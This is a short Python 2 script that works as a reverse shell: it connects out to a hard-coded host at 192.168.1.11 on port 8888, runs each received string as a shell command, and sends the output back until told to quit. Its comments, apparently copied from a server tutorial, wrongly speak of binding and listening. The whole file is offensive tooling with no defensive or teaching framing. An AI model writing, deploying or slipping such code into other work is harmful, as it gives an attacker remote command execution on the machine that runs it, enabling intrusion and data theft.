#!/usr/bin/python2.7
import socket,subprocess
import sys,os

HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'

#Bind socket to local host and port
try:
    s.connect((HOST, PORT))
except socket.error as msg:
    print 'connect failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

print 'Socket connect complete'

#Start listening on socket
s.send('Hello There!')

#now keep talking with the client
while 1:
    #wait to accept a connection - blocking call
    #conn, addr = s.accept()
    #print 'Connected with ' + addr[0] + ':' + str(addr[1])

    data = s.recv(1024)
    if data == "quit": break

    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read() + 'boohoo'
    s.send(stdoutput)

s.send('Bye now!')
s.close()
